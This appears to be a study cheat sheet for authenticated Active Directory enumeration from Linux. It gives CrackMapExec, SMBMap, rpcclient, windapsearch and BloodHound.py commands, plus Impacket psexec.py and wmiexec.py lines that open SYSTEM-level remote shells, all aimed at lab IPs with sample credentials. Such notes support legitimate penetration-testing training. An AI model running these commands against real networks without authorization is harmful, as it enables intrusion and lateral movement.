# Credentialed Enumeration From Linux

## **Authenticated Enumeration - from Linux**

### 1️⃣ CrackMapExec

* `sudo crackmapexec smb 10.20.30.40 -u alex -p StrongPass123 --users` → Enumerates domain users\
  Displays a list of domain users along with the `badPwdCount` attribute.
* `sudo crackmapexec smb 10.20.30.40 -u alex -p StrongPass123 --groups` → Enumerates domain groups\
  Provides a list of groups along with the number of users in each.
* `sudo crackmapexec smb 10.20.30.150 -u alex -p StrongPass123 --loggedon-users` → Shows currently logged-in users.
* `sudo crackmapexec smb 10.20.30.40 -u alex -p StrongPass123 --shares` → Lists available shared resources and access levels for the user.
* `sudo crackmapexec smb 10.20.30.40 -u alex -p StrongPass123 -M spider_plus`\
  This module scans all accessible shares for readable files. You can specify a particular share using `--share 'Finance Records'`.\
  The output is saved in `/tmp/cme_spider_plus/<target_ip>`.

### 2️⃣ SMBMap

* `smbmap -u alex -p StrongPass123 -d CORP.LOCAL -H 10.20.30.40` → Checks accessible resources and permission levels.
* `smbmap -u alex -p StrongPass123 -d CORP.LOCAL -H 10.20.30.40 -R 'Finance Records' --dir-only`\
  Displays all subdirectories within the specified directory without listing files.

### 3️⃣ rpcclient

[`rpcclient`](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a useful tool for interacting with Samba and MS-RPC services. It allows enumeration, modification, and deletion of Active Directory objects.

* `rpcclient -U "" -N 10.20.30.40` → Establishes a null session shell with the domain controller.
* `rpcclient$> queryuser 0x457` → Enumerates user by RID (0x457 in hex = 111 in decimal).
* `rpcclient$> enumdomusers` → Lists all domain users along with their RIDs.

### 4️⃣ Impacket Toolkit

#### Psexec.py

This tool uploads an executable to the `ADMIN$` share, creates a remote service, and establishes a SYSTEM-level shell.

* `psexec.py corp.local/jdoe:'SecurePass!1'@10.20.30.125` → Spawns a remote shell.

#### wmiexec.py

`wmiexec.py` leverages Windows Management Instrumentation (WMI) for command execution. Unlike `psexec.py`, it does not leave artifacts on the target system.

* `wmiexec.py corp.local/jdoe:'SecurePass!1'@10.20.30.40` → Opens a semi-interactive shell.

### 5️⃣ Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is a Python script for querying LDAP and extracting user, group, and computer information from an Active Directory domain.

* `python3 windapsearch.py --dc-ip 10.20.30.40 -u alex@corp.local -p StrongPass123 --da` → Retrieves members of the Domain Admins group.
* `python3 windapsearch.py --dc-ip 10.20.30.40 -u alex@corp.local -p StrongPass123 -PU` → Identifies privileged users.

### 6️⃣ BloodHound.py

Initially a PowerShell tool, `BloodHound.py` is a Python implementation useful for gathering AD-related data without needing a Windows machine.

* `sudo bloodhound-python -u 'alex' -p 'StrongPass123' -ns 10.20.30.40 -d corp.local -c all` → Runs BloodHound data collection.
  * `-ns` = Name server
  * `-d` = Domain
  * `-c` = Collection type (all data in this case)

The output consists of JSON files.

* `zip -r corp_bh.zip *.json` → Compresses collected data into a ZIP file.
